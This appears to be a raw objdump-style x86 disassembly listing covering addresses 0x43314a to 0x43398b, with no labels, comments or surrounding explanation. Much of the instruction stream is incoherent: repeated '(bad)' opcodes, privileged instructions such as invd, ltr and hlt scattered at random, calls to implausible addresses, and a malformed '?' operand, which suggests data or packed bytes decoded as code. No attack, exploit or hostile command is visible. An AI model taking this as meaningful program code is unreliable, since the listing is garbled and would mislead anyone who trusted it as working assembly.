  43314a:	sub    BYTE PTR [ebp+eax*2-0x63c4ca00],cl
  433151:	jne    0x4330de
  433153:	mov    ecx,DWORD PTR [eax]
  433155:	in     al,0x75
  433157:	pop    DWORD PTR [ecx+0x5101]
  43315d:	push   edx
  43315e:	inc    DWORD PTR [ebx]
  433160:	adc    BYTE PTR [ecx+0x45721cc6],cl
  433166:	add    BYTE PTR [edi+0x9],dl
  433169:	call   DWORD PTR [esi]
  43316b:	and    dl,al
  43316d:	and    bh,bh
  43316f:	inc    edi
  433171:	test   eax,edx
  433173:	sldt   ebx
  433176:	cmp    DWORD PTR [eax],eax
  433178:	pushf  
  433179:	(bad)  
  43317a:	jmp    0x433188
  43317c:	mov    eax,edi
  43317e:	or     al,0x75
  433180:	inc    eax
  433181:	call   0x432889
  433186:	mov    eax,eax
  433188:	loopne 0x43310e
  43318a:	inc    ebp
  43318b:	add    BYTE PTR [ebx+0x1451c00],cl
  433191:	mov    eax,DWORD PTR [ebp+0x20]
  433194:	add    edi,ecx
  433196:	add    BYTE PTR [eax],ch
  433198:	cmp    edi,0x18
  43319b:	test   DWORD PTR [ebp+0xf],esi
  43319e:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  4331a5:	jne    0x4331a9
  4331a7:	call   0xffa22c6c
  4331ac:	leave  
  4331ad:	rcr    BYTE PTR [esp+eax*4],0x55
  4331b1:	add    ah,ch
  4331b3:	add    BYTE PTR [edi-0x48fef979],dh
  4331b9:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  4331c0:	inc    esp
  4331c1:	mov    ebx,DWORD PTR [eax]
  4331c3:	fcom   st(2)
  4331c5:	add    BYTE PTR [edi],bl
  4331c7:	lea    ecx,[eax-0x18]
  4331ca:	(bad)  
  4331cb:	push   DWORD PTR [ecx]
  4331cd:	call   0xffb57f2f
  4331d2:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  4331d6:	fstp   DWORD PTR [esi+ebx*8]
  4331d9:	push   ebp
  4331da:	pop    ebp
  4331db:	mov    esi,DWORD PTR [edx-0x38]
  4331de:	add    DWORD PTR [eax],0x28
  4331e1:	mov    edi,DWORD PTR [ebx]
  4331e3:	xor    esi,DWORD PTR [edx+0x3]
  4331e6:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  4331ea:	pop    ebp
  4331eb:	or     al,0x4
  4331ed:	inc    ecx
  4331ee:	push   ebp
  4331ef:	(bad)  
  4331f0:	in     al,dx
  4331f1:	or     ah,ch
  4331f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4331f4:	xbegin 0xffc8a7ea
  4331fa:	clc    
  4331fb:	adc    al,0x45
  4331fd:	idiv   BYTE PTR [ecx]
  4331ff:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  433206:	test   DWORD PTR [ecx+0x665b00f8],ebx
  43320c:	add    BYTE PTR [ecx+0x66],dh
  43320f:	add    eax,DWORD PTR [ebp+0x52]
  433212:	adc    eax,0x20
  433215:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  43321b:	test   DWORD PTR [eax],eax
  43321d:	clc    
  43321e:	data16 or al,BYTE PTR [ebp+0x45]
  433222:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  433229:	rol    BYTE PTR [ebp+0x45],1
  43322c:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  433232:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  433238:	push   ebx
  433239:	add    BYTE PTR [ecx+0x0],dl
  43323c:	push   ecx
  43323d:	jge    0x433272
  43323f:	add    BYTE PTR [esi+0x4],dl
  433242:	jne    0x4332a9
  433244:	mov    edx,0x457200
  433249:	jmp    0x43320d
  43324b:	xor    edi,DWORD PTR [ebx]
  43324d:	pop    edi
  43324e:	cvtdq2ps xmm7,xmm0
  433251:	ret    0x0
  433254:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  43325a:	xor    ecx,DWORD PTR [edi]
  43325c:	add    eax,DWORD PTR [ecx+0x3b]
  43325f:	push   ebx
  433260:	rdpmc  
  433262:	out    0x8d,al
  433264:	add    BYTE PTR [eax],cl
  433266:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  43326c:	ret    0x450c
  43326f:	sbb    al,0x8b
  433271:	cmp    eax,esi
  433273:	or     cl,al
  433275:	or     al,0xc2
  433277:	pop    eax
  433278:	inc    ebp
  433279:	add    ecx,DWORD PTR [edi]
  43327b:	add    esi,DWORD PTR [ebp+0x39]
  43327e:	invd   
  433280:	jge    0x43328c
  433282:	mov    eax,0x478ac0
  433287:	cli    
  433288:	xor    esp,ecx
  43328a:	mov    ebx,0x5b8ac0
  43328f:	ret    0x33
  433292:	mov    eax,0x833a8b
  433297:	sub    BYTE PTR [ebx],al
  433299:	inc    ebp
  43329a:	data16 ss clc 
  43329d:	pushf  
  43329e:	inc    bh
  4332a0:	mov    esp,esp
  4332a2:	hlt    
  4332a3:	test   DWORD PTR [ebp-0x8],esi
  4332a6:	mov    eax,DWORD PTR [ebp-0x14]
  4332a9:	cmp    BYTE PTR [ebx-0x76478864],cl
  4332af:	dec    edi
  4332b0:	or     BYTE PTR [eax],al
  4332b2:	jne    0x43323d
  4332b4:	mov    esi,esp
  4332b6:	call   0x77a9be7b
  4332bb:	inc    ebp
  4332bc:	mov    DWORD PTR [eax+0x994f0c],edi
  4332c2:	add    BYTE PTR [ecx-0x3ffe0717],cl
  4332c8:	add    BYTE PTR [esi+0x7d],ah
  4332cb:	inc    ebp
  4332cc:	mov    bx,WORD PTR [ebp+0x8]
  4332d0:	add    DWORD PTR [ebp+0x51],0x30c008b
  4332d7:	inc    ebp
  4332d8:	mov    bx,di
  4332db:	lock test BYTE PTR [ecx+0x7000801],bh
  4332e2:	jge    0x4332a5
  4332e4:	mov    ecx,DWORD PTR [ebx-0x660613f0]
  4332ea:	cli    
  4332eb:	xor    bl,bh
  4332ed:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  4332f3:	test   BYTE PTR [eax],cl
  4332f5:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  4332fc:	cmp    ebp,eax
  4332fe:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  433305:	test   BYTE PTR [ebp+0x1],bh
  433308:	mov    ebx,0x458a00
  43330d:	xor    esi,DWORD PTR [ebx]
  43330f:	add    esp,DWORD PTR [esi-0x77]
  433312:	pop    ebp
  433313:	loopne 0x43337b
  433315:	inc    ebp
  433316:	clc    
  433317:	xor    edi,DWORD PTR [ebx]
  433319:	add    esi,DWORD PTR [edx-0x77]
  43331c:	data16 fdivr QWORD PTR [ebp-0x49]
  433320:	mov    ebx,0xb78afc
  433325:	hlt    
  433326:	xor    edi,DWORD PTR [eax]
  433328:	data16 add BYTE PTR [ebp+0x66],bl
  43332c:	data16 lock clc 
  43332f:	cmp    BYTE PTR [ebx],bh
  433331:	add    BYTE PTR [edi+0x66],dh
  433334:	psubq  mm7,QWORD PTR [ebp-0x2]
  433338:	ltr    WORD PTR [ebp+0x66]
  43333c:	add    esi,eax
  43333e:	add    di,WORD PTR [ebp+0x2b]
  433342:	data16 data16 jge 0x4333c3
  433346:	mov    ebx,0xe08a8b
  43334b:	jge    0x433380
  43334d:	data16 data16 xor al,0x5d
  433351:	data16 data16 jne 0x43334d
  433355:	mov    edi,DWORD PTR [ebx]
  433357:	fdiv   QWORD PTR [edx+0x7d]
  43335a:	data16 data16 jge 0x433392
  43335e:	mov    ebx,0x758a66
  433363:	mov    esi,0x667233
  433368:	pop    ebp
  433369:	or     BYTE PTR [esi+0x0],ah
  43336c:	clc    
  43336d:	mov    edi,DWORD PTR [ebx]
  43336f:	lock ja 0x4332fd
  433372:	(bad)  
  433374:	jge    0x43336d
  433376:	invd   
  433378:	pop    ebp
  433379:	add    BYTE PTR [ebx],al
  43337b:	(bad)  
  43337c:	cmp    di,WORD PTR [ebp+0xf]
  433380:	data16 sbb bh,BYTE PTR [ebp+0x0]
  433384:	mov    bx,WORD PTR [ebp-0x10]
  433388:	pop    bp
  43338a:	fbstp  TBYTE PTR [ebx]
  43338c:	test   DWORD PTR [ebx],eax
  43338e:	add    BYTE PTR [ebx],bh
  433390:	add    BYTE PTR [esi+0x7d],ah
  433393:	jge    0x433320
  433395:	data16 in al,dx
  433397:	pop    ebp
  433398:	stc    
  433399:	bsf    ecx,DWORD PTR [ebp+0x66320099]
  4333a0:	mov    edi,ebx
  4333a2:	in     al,dx
  4333a3:	test   BYTE PTR [ebp+0x0],bh
  4333a6:	mov    eax,DWORD PTR [eax]
  4333a8:	call   0xbd402d38
  4333ad:	cmp    BYTE PTR [ecx-0x7699ce00],bl
  4333b3:	sti    
  4333b4:	call   0x8b4bb144
  4333b9:	add    ebp,esp
  4333bb:	mov    bx,di
  4333be:	jnp    0x4333e6
  4333c0:	mov    DWORD PTR [ebx+0x387df808],ecx
  4333c6:	mov    eax,DWORD PTR [eax]
  4333c8:	call   0x7c3ebf33
  4333cd:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  4333d3:	data16 data16 fistp WORD PTR [ebp+0xe]
  4333d8:	xor    DWORD PTR [edi-0x48fff7af],0xfb66f403
  4333e2:	fisttp WORD PTR [ecx-0x7401f77b]
  4333e8:	(bad)  
  4333e9:	cld    
  4333ea:	jne    0x433424
  4333ec:	xor    eax,DWORD PTR [eax]
  4333ee:	mov    esp,DWORD PTR [esi-0x10]
  4333f1:	sti    
  4333f2:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  4333f9:	data16 adc bl,bh
  4333fc:	push   ebp
  4333fd:	xor    ecx,DWORD PTR es:[ebx+0x38e4f88b]
  433404:	mov    WORD PTR [eax],es
  433406:	cdq    
  433407:	data16 xor bh,bl
  43340a:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  433410:	mov    esp,DWORD PTR [esi-0x14]
  433413:	fisttp WORD PTR [ebx-0x3748a9f2]
  433419:	or     al,0x2b
  43341b:	mov    bh,0xba
  43341d:	hlt    
  43341e:	mov    bh,bl
  433420:	add    BYTE PTR [ecx-0x7446f3cd],cl
  433426:	dec    edi
  433427:	or     al,0x0
  433429:	mov    edi,DWORD PTR [ebx]
  43342b:	or     BYTE PTR [ebp+0x3b],dh
  43342e:	mov    ecx,DWORD PTR [edi]
  433430:	fdivr  QWORD PTR [ebx-0x7499ff83]
  433436:	xor    al,0xd8
  433438:	pop    bp
  43343a:	lock xor esi,DWORD PTR [ebx]
  43343d:	lea    esp,[esi+0x1f]
  433440:	icebp  
  433441:	jb     0x433447
  433443:	add    al,al
  433445:	jge    0x433453
  433447:	mov    eax,eax
  433449:	fsubr  st,st(3)
  43344b:	pop    ebp
  43344c:	mov    esi,DWORD PTR [ebx]
  43344e:	in     al,0x8d
  433450:	rcr    DWORD PTR [edi],0xc2
  433453:	jb     0x4334b3
  433455:	add    cl,cl
  433457:	jge    0x433465
  433459:	mov    edx,DWORD PTR [ebp-0x20]
  43345c:	in     al,dx
  43345d:	pop    ebp
  43345e:	data16 data16 or BYTE PTR [esi+edi*4],bh
  433463:	data16 cmp bh,BYTE PTR [ebp+0x0]
  433467:	mov    ebp,DWORD PTR [ebx]
  433469:	fdivr  QWORD PTR [esi+0x668a5d]
  43346f:	cmp    al,0x33
  433471:	mov    si,0x4f7d
  433475:	mov    eax,DWORD PTR [eax]
  433477:	lock inc ebp
  433479:	mov    esi,DWORD PTR [edi]
  43347b:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  433482:	clc    
  433483:	(bad)  
  433484:	cmp    edi,DWORD PTR [ebx]
  433486:	je     0x433497
  433488:	push   ebx
  433489:	loopne 0x43349a
  43348b:	dec    ecx
  43348d:	mov    esp,DWORD PTR [edi-0x1c]
  433490:	int    0xf1
  433492:	mov    esi,0x703084d
  433497:	pcmpgtd mm6,mm1
  43349a:	add    BYTE PTR [ebp+0x66],dh
  43349d:	jmp    0x43346a
  43349f:	mov    eax,DWORD PTR [ebx]
  4334a1:	lock push ebp
  4334a3:	ror    DWORD PTR [ebp-0x2972feb3],1
  4334a9:	or     bh,dl
  4334ab:	jb     0x4334ab
  4334ad:	add    BYTE PTR [ebx-0x1a7487b3],cl
  4334b3:	loopne 0x4334b5
  4334b5:	jne    0x4334b5
  4334b7:	data16 add BYTE PTR [esi+eiz*2],dh
  4334bb:	mov    ecx,ebx
  4334bd:	data16 cmp cl,dh
  4334c0:	add    BYTE PTR [eax],bh
  4334c2:	data16 add bl,cl
  4334c5:	data16 cmp dh,dl
  4334c8:	add    BYTE PTR [edx],bh
  4334ca:	data16 add bl,cl
  4334cd:	enterw 0x4df1,0x19
  4334d2:	pop    edi
  4334d3:	jne    0x433456
  4334d5:	mov    esi,DWORD PTR [edi]
  4334d7:	call   0x77b7c078
  4334dc:	xor    ebp,DWORD PTR [ebx]
  4334de:	lea    esp,[esi+0x48]
  4334e1:	repnz in eax,0x3b
  4334e4:	add    BYTE PTR [ebp-0x37],dh
  4334e7:	xor    edx,DWORD PTR [ebp-0x15]
  4334ea:	in     al,dx
  4334eb:	xor    edx,DWORD PTR [esi+0x40]
  4334ee:	mov    DWORD PTR [edi],0x338545fc
  4334f4:	clc    
  4334f5:	add    esi,DWORD PTR [esi]
  4334f7:	pop    edi
  4334f8:	pushf  
  4334f9:	pop    ebx
  4334fa:	call   0xff4434c1
  4334ff:	mov    edi,eax
  433501:	push   ecx
  433502:	pop    es
  433503:	mov    edi,DWORD PTR [edx]
  433505:	push   esi
  433506:	inc    esp
  433507:	(bad)  
  433508:	jle    0x43350a
  43350a:	popa   
  43350b:	data16 (bad) 
  43350d:	into   
  43350e:	addr16 cmp ch,cl
  433511:	add    BYTE PTR [ecx+0x7ce0866],bh
  433517:	cmp    ah,BYTE PTR [esi+0x0]
  43351a:	add    bh,al
  43351c:	(bad)  
  43351d:	cld    
  43351e:	add    BYTE PTR [ebp+0x36c3f866],al
  433524:	cmp    BYTE PTR [eax+eax*1-0x3c31999a],bl
  43352b:	pop    ebp
  43352c:	or     BYTE PTR [edi+0x0],dl
  43352f:	mov    bh,0x66
  433531:	mov    edi,0xff038dc3
  433536:	jne    0x433589
  433538:	lea    edx,[ecx+0x1]
  43353b:	mov    ebx,0xd64ff1
  433540:	sar    DWORD PTR [ebx],1
  433542:	test   BYTE PTR [ebp+0x32],dh
  433545:	mov    DWORD PTR [esp+edi*8-0x76],esp
  433549:	push   edi
  43354a:	xor    BYTE PTR [ebx],0x3a
  43354d:	mov    esi,ebx
  43354f:	xor    eax,DWORD PTR [eax-0x3c73819a]
  433555:	xor    al,BYTE PTR [ebp+0x64]
  433558:	pop    ebx
  433559:	mov    ebx,0x9c3a37
  43355e:	je     0x43358b
  433560:	xor    edi,DWORD PTR [ebx+0x668a33]
  433566:	mov    WORD PTR [ebx],?
  433568:	xor    bh,BYTE PTR [ebx+0x8b4f64]
  43356e:	pop    edi
  43356f:	cmp    ecx,ecx
  433571:	jne    0x4335c8
  433573:	mov    ebp,esp
  433575:	cld    
  433576:	push   esi
  433577:	pop    ebx
  433578:	inc    ebp
  433579:	stc    
  43357a:	aaa    
  43357b:	test   DWORD PTR [eax+edi*8-0x317af642],ebx
  433582:	clc    
  433583:	test   dl,dl
  433585:	xor    al,0xff
  433587:	fs pop si
  43358a:	or     bl,al
  43358c:	dec    BYTE PTR [ebx+0x57665100]
  433592:	retf   0x3845
  433595:	aaa    
  433596:	add    BYTE PTR [esi+eiz*2+0x3a85cabe],bl
  43359d:	clc    
  43359e:	add    BYTE PTR [ebx+0x66],bl
  4335a1:	dec    edx
  4335a3:	mov    edx,DWORD PTR [edi-0x76]
  4335a6:	push   edi
  4335a7:	add    al,0xb7
  4335a9:	xor    al,0xba
  4335ab:	cmp    al,0x8d
  4335ad:	je     0x4335ae
  4335af:	mov    edx,DWORD PTR [ecx-0x46]
  4335b2:	push   ecx
  4335b3:	lea    edi,[ebx+0x514fff]
  4335b9:	push   ecx
  4335ba:	cmp    edx,DWORD PTR [ebx+0x75]
  4335bd:	mov    ecx,DWORD PTR [ecx+0x723afcbb]
  4335c3:	add    BYTE PTR [ebx],dh
  4335c5:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  4335cb:	add    BYTE PTR [ebx+esi*1+0x4f64bb32],cl
  4335d2:	mov    ebx,0x3b3a00
  4335d7:	jne    0x433604
  4335d9:	mov    DWORD PTR [ebx+0x728afc],edi
  4335df:	xor    esi,DWORD PTR [ebx]
  4335e1:	mov    edi,DWORD PTR [ebx+0x8d4f33]
  4335e7:	push   edi
  4335e8:	cmp    esp,ebp
  4335ea:	jne    0x4335ec
  4335ec:	sbb    DWORD PTR [eax],0x8085c3fc
  4335f2:	clc    
  4335f3:	inc    esp
  4335f4:	pop    ebx
  4335f5:	sti    
  4335f6:	add    eax,0xeb8bc075
  4335fb:	cld    
  4335fc:	xor    edi,DWORD PTR ds:0xf8c3855e
  433602:	mov    ecx,DWORD PTR [ecx+edx*2]
  433605:	rol    DWORD PTR [ebp-0x37],0xf
  433609:	mov    DWORD PTR [eax],ecx
  43360b:	inc    edi
  43360c:	(bad)  
  43360d:	in     eax,0x2
  43360f:	add    bh,bh
  433611:	(bad)  
  433612:	mov    esi,0xc38a5e
  433617:	mov    esi,DWORD PTR [ebx]
  433619:	push   ecx
  43361a:	mov    edi,0xfc4fc7
  43361f:	test   DWORD PTR [ebp-0x8],edx
  433622:	data16 ss (bad) 
  433625:	pushf  
  433626:	sub    ebp,eax
  433628:	inc    ebp
  433629:	(bad)  
  43362a:	sub    edi,edi
  43362c:	mov    DWORD PTR [ebx+0x3a03ba08],ecx
  433632:	inc    ebp
  433633:	add    BYTE PTR [esi+0x2b],ah
  433636:	or     bh,BYTE PTR [edx+0xf8ac2]
  43363c:	cmp    al,0x33
  43363e:	mov    edi,DWORD PTR [edx+0x24f81]
  433644:	(bad)  
  433645:	cmp    esi,DWORD PTR [ebx]
  433647:	je     0x433601
  433649:	push   ebx
  43364a:	dec    edi
  43364b:	str    ecx
  43364e:	cmp    esp,DWORD PTR [edi+0x75]
  433651:	int    0x33
  433653:	mov    edi,0x789085f
  433658:	mov    ecx,DWORD PTR [eax]
  43365a:	cld    
  43365b:	add    cl,cl
  43365d:	data16 add al,0xcb
  433660:	push   ebp
  433661:	add    ebp,esp
  433663:	jne    0x433651
  433665:	(bad)  
  433666:	mov    DWORD PTR [ecx],0xd685f7ec
  43366c:	clc    
  43366d:	xlat   BYTE PTR ds:[ebx]
  43366e:	inc    ebp
  43366f:	mov    edi,DWORD PTR [ecx]
  433671:	push   eax
  433672:	pushf  
  433673:	in     eax,0x8b
  433675:	add    ah,ch
  433677:	(bad)  
  433678:	push   ecx
  433679:	add    BYTE PTR [ecx+0x66],dl
  43367c:	add    eax,0x3872cb
  433681:	add    BYTE PTR [ebp+0x66],al
  433684:	(bad)  
  433685:	retf   
  433686:	lock cmp al,BYTE PTR [ebp+0x4566f800]
  43368d:	retf   
  43368e:	cmp    cl,al
  433690:	pushf  
  433691:	jge    0x43365a
  433693:	aaa    
  433694:	cld    
  433695:	pushf  
  433696:	test   DWORD PTR [edi-0x8],ebx
  433699:	je     0x4336e0
  43369b:	xor    esi,DWORD PTR ds:0x7020840
  4336a1:	ror    BYTE PTR [ebp-0x37],0x8d
  4336a5:	push   ebp
  4336a6:	add    esp,ebp
  4336a8:	jb     0x433635
  4336aa:	add    BYTE PTR [eax],cl
  4336ac:	dec    ebp
  4336ad:	mov    bh,0x81
  4336af:	push   esi
  4336b0:	push   ecx
  4336b1:	adc    DWORD PTR [ecx-0x3b],0x3899ff81
  4336b8:	xor    al,BYTE PTR [eax]
  4336ba:	mov    edx,DWORD PTR [edi+0x10]
  4336bd:	(bad)  
  4336be:	scas   eax,DWORD PTR es:[edi]
  4336bf:	cmp    bh,BYTE PTR [ebx]
  4336c1:	add    BYTE PTR [edi],cl
  4336c3:	mov    ebp,ebp
  4336c5:	cld    
  4336c6:	add    BYTE PTR [ebx],bh
  4336c8:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  4336cc:	dec    ebp
  4336cd:	or     BYTE PTR [ebx],ch
  4336cf:	ret    0x458b
  4336d2:	lock jmp 0x4336c6
  4336d5:	mov    ecx,DWORD PTR [eax]
  4336d7:	or     BYTE PTR [edi],al
  4336d9:	mov    ecx,eax
  4336db:	xor    DWORD PTR [edx+0x2],0x0
  4336df:	mov    bh,0xc1
  4336e1:	adc    BYTE PTR [eax],dh
  4336e3:	iret   
  4336e4:	inc    ebp
  4336e5:	mov    DWORD PTR [ebx],0x4dfff8c5
  4336eb:	inc    BYTE PTR [ebx]
  4336ed:	cmp    bh,al
  4336ef:	add    BYTE PTR [ecx],dl
  4336f1:	data16 adc al,bh
  4336f4:	dec    ecx
  4336f5:	fisttp WORD PTR [ecx+0x456604c0]
  4336fb:	add    dh,BYTE PTR ds:0x75e0845
  433701:	ret    0x4d
  433704:	lea    ecx,[ebx+0x18728301]
  43370a:	add    BYTE PTR [ebp+0x45],al
  43370d:	ss jmp 0x10a37af
  433713:	call   0xf8cebc5d
  433718:	clc    
  433719:	inc    ebp
  43371a:	shl    DWORD PTR ds:0x781084d,0x51
  433721:	cdq    
  433722:	push   ecx
  433723:	xor    al,BYTE PTR [ecx+0x32f89989]
  433729:	inc    ebp
  43372a:	cmp    edi,DWORD PTR [esi]
  43372c:	jbe    0x4336ca
  43372e:	mov    eax,edi
  433730:	or     ah,dh
  433732:	inc    ebp
  433733:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  433739:	cmp    BYTE PTR [ebx-0x74747664],cl
  43373f:	in     al,dx
  433740:	hlt    
  433741:	push   ecx
  433742:	push   ecx
  433743:	push   ecx
  433744:	push   ecx
  433745:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  43374b:	cdq    
  43374c:	cdq    
  43374d:	xor    dh,BYTE PTR [edx]
  43374f:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  433755:	or     BYTE PTR [ebp+0x7],al
  433758:	mov    eax,ecx
  43375a:	clc    
  43375b:	jb     0x43371e
  43375d:	add    BYTE PTR [ebp+0x55],cl
  433760:	or     DWORD PTR [edi],0xc251d151
  433766:	add    DWORD PTR [ebx+0x320099],0x8b76453b
  433770:	mov    edi,eax
  433772:	or     cl,al
  433774:	inc    ebp
  433775:	dec    ebp
  433776:	mov    eax,DWORD PTR [ecx+0x514d510c]
  43377c:	or     WORD PTR [ecx],0x8999
  433781:	xor    cl,BYTE PTR [ebx+0x5176fc3b]
  433787:	mov    edx,DWORD PTR [ecx+0x8]
  43378a:	mov    eax,DWORD PTR [ebp-0x8]
  43378d:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb267]
  433794:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  43379a:	inc    ebp
  43379b:	dec    eax
  43379c:	add    ecx,DWORD PTR [ebx+0x514df0f8]
  4337a2:	add    edx,DWORD PTR [ecx-0x8]
  4337a5:	mov    ecx,DWORD PTR [ecx]
  4337a7:	clc    
  4337a8:	or     BYTE PTR [ebp+eax*2+0x45324099],al
  4337af:	mov    ecx,ebp
  4337b1:	clc    
  4337b2:	(bad)  
  4337b3:	popf   
  4337b4:	inc    DWORD PTR [eax]
  4337b6:	ret    0x8b
  4337b9:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  4337bf:	mov    edi,esp
  4337c1:	hlt    
  4337c2:	test   ecx,esi
  4337c4:	clc    
  4337c5:	or     BYTE PTR [ebp+0x7],al
  4337c8:	cmp    ecx,eax
  4337ca:	pushf  
  4337cb:	jb     0x433800
  4337cd:	add    BYTE PTR [eax-0x3f],al
  4337d0:	inc    eax
  4337d1:	daa    
  4337d2:	inc    ebp
  4337d3:	inc    ebp
  4337d4:	xor    eax,0x7f80803
  4337d9:	dec    ebp
  4337da:	cdq    
  4337db:	add    esi,DWORD PTR [edx]
  4337dd:	clc    
  4337de:	cmp    DWORD PTR [ecx],ecx
  4337e0:	or     al,0x8
  4337e2:	add    al,BYTE PTR [ebp+0x2c]
  4337e5:	xor    eax,0x7350845
  4337ea:	or     BYTE PTR [ebp+0x7],cl
  4337ed:	lea    ebx,[ecx-0x748dcdff]
  4337f3:	add    BYTE PTR [eax*2-0x74b21438],cl
  4337fa:	mov    edx,DWORD PTR [eax]
  4337fc:	cld    
  4337fd:	dec    ebp
  4337fe:	push   ecx
  4337ff:	sub    edx,DWORD PTR [ecx-0x75]
  433802:	add    eax,0xf172fc
  433807:	or     BYTE PTR [ebp+0x7],cl
  43380a:	add    eax,ecx
  43380c:	or     al,0x72
  43380e:	add    DWORD PTR [eax],eax
  433810:	mov    ebx,0x29c2c1
  433815:	inc    ebp
  433816:	mov    eax,DWORD PTR [ebx]
  433818:	cmp    eax,0x3004d1c
  43381e:	xbegin 0x66c8c418
  433824:	clc    
  433825:	or     BYTE PTR [ebp+0x45],al
  433828:	cmp    DWORD PTR ds:0x78b089c,esi
  43382e:	adc    BYTE PTR [ebp+0x45],cl
  433831:	lea    eax,[ebp+0x33727501]
  433837:	add    cl,ch
  433839:	inc    ebp
  43383a:	add    bl,ch
  43383c:	add    BYTE PTR [ebx+0x45850845],cl
  433842:	je     0x4337cf
  433844:	push   ebx
  433845:	or     al,0x85
  433847:	dec    ebp
  433848:	std    
  433849:	mov    bh,bh
  43384b:	mov    BYTE PTR [ebp-0x75],al
  43384e:	mov    edi,eax
  433850:	or     al,0x89
  433852:	inc    ebp
  433853:	clc    
  433854:	mov    esp,esp
  433856:	hlt    
  433857:	call   DWORD PTR [edi-0x37]
  43385a:	push   ecx
  43385b:	or     al,0x51
  43385d:	push   ebp
  43385e:	xor    ebp,esp
  433860:	mov    esi,0x457251
  433865:	ss (bad) 
  433867:	pushf  
  433868:	inc    ebp
  433869:	(bad)  
  43386a:	mov    edi,eax
  43386c:	or     al,0x85
  43386e:	add    al,bh
  433870:	inc    eax
  433872:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  433876:	or     ah,bh
  433878:	inc    eax
  433879:	push   ecx
  43387a:	jmp    0x4338cd
  43387c:	mov    eax,DWORD PTR ds:0xe8720c
  433882:	mov    DWORD PTR [ebp-0x8],eax
  433885:	jne    0x4338cc
  433887:	jmp    0x433814
  433889:	mov    ebp,DWORD PTR [eax]
  43388b:	clc    
  43388c:	retf   0xff51
  43388f:	push   ecx
  433890:	mov    DWORD PTR ds:0x757210,eax
  433896:	mov    ecx,DWORD PTR [ebp-0x4]
  433899:	sub    esp,DWORD PTR [ebx-0x77]
  43389c:	dec    DWORD PTR [eax*4-0x74ca8abb]
  4338a3:	or     ah,bh
  4338a5:	pop    es
  4338a6:	ds cdq 
  4338a8:	push   DWORD PTR [edx]
  4338aa:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  4338b0:	(bad)  
  4338b1:	mov    bh,bh
  4338b3:	jmp    0x4338a1
  4338b5:	leave  
  4338b6:	jne    0x4338c0
  4338b8:	call   0x303212
  4338bd:	in     al,dx
  4338be:	dec    ebp
  4338bf:	add    dh,BYTE PTR [ebx]
  4338c1:	add    BYTE PTR [ebx],al
  4338c3:	inc    ebp
  4338c4:	cmp    esi,DWORD PTR [esi]
  4338c6:	je     0x433864
  4338c8:	mov    eax,edi
  4338ca:	or     al,0xf0
  4338cc:	add    BYTE PTR [ebp+0x458bf845],al
  4338d2:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  4338d8:	adc    al,0x7
  4338da:	enter  0x9fc0,0xa5
  4338de:	rol    BYTE PTR [eax],0x5e
  4338e1:	mov    ecx,ecx
  4338e3:	or     al,0xc
  4338e5:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  4338ec:	jmp    0x4338ed
  4338ee:	push   ebp
  4338ef:	mov    esp,ebp
  4338f1:	cld    
  4338f2:	inc    ebp
  4338f3:	inc    ebp
  4338f4:	or     DWORD PTR [ecx+0x457dec10],0x0
  4338fb:	push   esi
  4338fc:	push   esi
  4338fd:	mov    edi,0x7af080f
  433902:	add    bh,al
  433904:	test   DWORD PTR [ecx+0x3a7320f],ebx
  43390a:	add    BYTE PTR [ecx+0x4540100f],cl
  433910:	mov    ebp,eax
  433912:	mov    ebp,edi
  433914:	lock call edx
  433917:	fcom   DWORD PTR [ebp+0x45]
  43391a:	mov    eax,0x148a8b
  43391f:	push   ecx
  433920:	enter  0xc145,0x83
  433924:	cmp    cl,BYTE PTR [eax]
  433926:	add    BYTE PTR [ebp+0x4d],al
  433929:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  43392f:	call   0xffa3349e
  433934:	cmp    eax,DWORD PTR [ebp-0xc]
  433937:	jmp    DWORD PTR [eax+edx*1-0x4e]
  43393b:	push   ebp
  43393c:	(bad)
  43393f:	std    
  433940:	lock push DWORD PTR [edi+0x5d08fcdb]
  433947:	inc    ebp
  433948:	(bad)  
  433949:	call   0xff7d35d9
  43394e:	add    al,BYTE PTR [ebp+0x37]
  433951:	xor    esi,DWORD PTR [edi+0x4f50bf03]
  433957:	jne    0x433959
  433959:	(bad)  
  43395a:	cmp    edi,esp
  43395c:	jne    0x43398f
  43395e:	mov    edi,edi
  433960:	or     BYTE PTR [ebx-0x307f0b49],cl
  433966:	pop    ds
  433967:	into   
  433968:	je     0x43392b
  43396a:	mov    ebx,DWORD PTR [esi]
  43396c:	or     BYTE PTR [ebp-0x49],al
  43396f:	mov    esp,DWORD PTR [esi-0x77]
  433972:	mov    esi,0xfe451f0c
  433977:	mov    eax,DWORD PTR [eax]
  433979:	or     al,0x66
  43397b:	sar    bl,0x3b
  43397e:	xor    esi,DWORD PTR [ebp+0x66]
  433981:	xor    ecx,edi
  433983:	pop    edi
  433984:	adc    bl,BYTE PTR [ebx+0x7e]
  433987:	ret    0xff
  43398a:	cld    
  43398b:	inc    ebp
